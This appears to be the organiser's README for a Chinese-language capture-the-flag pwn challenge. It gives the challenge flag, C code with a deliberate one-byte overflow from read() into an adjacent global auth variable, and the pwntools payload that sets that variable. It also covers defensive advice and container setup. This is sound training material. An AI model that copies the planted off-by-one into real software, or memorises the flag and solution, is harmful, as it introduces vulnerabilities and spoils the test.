# pwn-one-byte

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 易 |
| 考点 | 全局变量相邻布局；`read` 多读 1 字节；单字节改写判断位 |
| 容器端口 | 宿主机 9104 → 容器 1337 |
| Flag | `flag{one_byte_write_changes_the_branch}` |

## 题面（直接复制到平台「简介」）

一个演示用的"登记名字"程序，名字写进全局数组，另有一个全局标志位决定你算普通用户还是管理员。用 `nc <地址> 9104` 连上去，会看到 `name:`。目标：让它走管理员分支并打印 flag。

**提示**：`nm` 列出的全局变量里，`name` 和 `auth` 的地址只差几个字节；再回头核对 `read` 的长度参数。

## 二、题目描述

```
nc <host> 9104
name:
```

```c
char name[16];
int auth = 0;
read(0, name, sizeof(name) + 1);   /* 17 字节 */
if (auth) { system("cat /app/flag"); }
```

`read` 的上限比 `name` 大 1 字节，多出来的那 1 字节正好落在 `auth` 上。

## 三、解题步骤

1. 看两个全局变量的地址：

```bash
nm files/pwn | grep -E ' name$| auth$'
# 0000000000404060 B name
# 0000000000404070 B auth
readelf -s files/pwn | grep -E 'name|auth'
```

`auth` 比 `name` 高 0x10 = 16 字节，正好是 `name` 的长度。

2. 构造输入：16 个字节填满 `name`，第 17 个字节写进 `auth` 的最低位。
   `auth` 是 `int`，小端存放，最低位字节写 1 就让整个 `int` 非 0。

```python
p.recvuntil(b'name:')
p.send(b'A' * 16 + b'\x01')
```

3. 跑 exp：

```bash
python3 exp/exp.py
```

输出：

```
welcome, admin
flag{...}
```

## 四、原理

未初始化的全局变量在 `.bss`，链接器按声明顺序、按各自对齐要求排布。
`char name[16]` 的对齐是 1，`int auth` 的对齐是 4，`0x404060 + 16 = 0x404070` 本身 4 字节对齐，
因此两者之间没有填充。

`read(0, name, 17)` 写第 17 个字节时目标地址是 `0x404070`，即 `auth` 的

最低有效字节（小端）。写 `0x01` 后 `auth == 1`，`if (auth)` 成立。

这类题的本质是"越界写正好落在有意义的字节上"，不需要改控制流，改动一个数据字节即可。

## 五、防御建议

- `read` 的长度常量用 `sizeof(name)`，不要手写 `+1`；写成 `sizeof name` 时类型检查也会更严。
- 用 `-D_FORTIFY_SOURCE=2` 编译：已知目标对象大小时 `read` 会被换成 `__read_chk`，
  `0x11 > sizeof(name)` 会在运行期直接 abort。
- 敏感标志位不要和可写缓冲区放进同一个结构体/相邻全局区，或放在独立页并设为只读。
- 全局变量加 `__attribute__((aligned(64)))` 之类的强对齐，避免被单字节越界命中。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/pwn` | 与容器内一致的二进制 |
| `src/pwn.c` | 源码 |
| `exp/exp.py` | pwntools 脚本 |
| `Dockerfile` / `entrypoint.sh` / `docker-compose.yml` | 容器 |
| `checker/main.rx` | 判题脚本 |

`checksec`：

```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

关键地址：`name = 0x404060`，`auth = 0x404070`，`main = 0x401196`。

---

## 平台镜像配置（添加镜像时照这张表填）

| 字段 | 填什么 | 说明 |
|---|---|---|
| 容器名称 | `pwn-one-byte` | 与题目目录名、tar 文件名保持一致 |
| 镜像标签 | `<registry>/<bucket>/pwn-one-byte` | 仓库名取自 tar 文件名（去扩展名），上传后 UI 自动带出 |
| 镜像版本 | 上传后生成的 Unix 时间戳 | 下拉选最新那条，不要手填 |
| 镜像拉取策略 | `Always` | 与平台默认一致 |
| 服务描述 | Pwn/交互题（nc 连上去打） | 只是备注，不影响运行 |
| 传输协议 | `tcp` | 全库只有 TCP 服务 |
| 应用协议 | `raw` | 裸 TCP / SSH / socat 选 raw |
| **服务端口** | **`1337`** | 容器内实际监听端口，必须与 Dockerfile 的 `EXPOSE` 一致 |
| CPU 限制 | `0.1, 0.3` | 最小, 最大（核） |
| 内存限制（MB） | `64, 128` | 最小, 最大 |
| 存储限制（MB） | `64, 1024` | 最小, 最大 |
| restricted | **勾选** | 平台会 drop `NET_BIND_SERVICE`，所以容器监听的是 `1337` 而不是 80 |
| 出网 | **关闭** | 本题不需要外网 |

> 端口必须填 **1337**。这是 socat / 裸 TCP 服务的监听端口，选手用 `nc <地址> <映射端口>` 连。
